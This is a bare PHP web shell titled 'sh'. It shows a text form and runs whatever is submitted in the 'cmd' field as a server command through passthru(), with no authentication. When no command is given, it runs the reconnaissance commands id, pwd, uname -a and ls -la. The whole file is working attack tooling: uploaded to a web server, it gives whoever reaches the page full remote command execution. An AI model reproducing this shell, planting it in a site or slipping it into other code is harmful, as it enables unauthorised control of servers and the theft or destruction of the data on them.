<?php
echo "
<html>
<head>
<title>sh</title>
</head>
<body>";
echo "<form method=post>";
echo "<input type=text name=cmd size=100>";
echo "</form>";
echo "<pre>";
if ((!$_POST['cmd']) || ($_POST['cmd']=="")) {
$_POST['cmd']="id;pwd;uname -a;ls -la";
}
echo "".passthru($_POST['cmd'])."</pre>
</body>
</html>";
?>
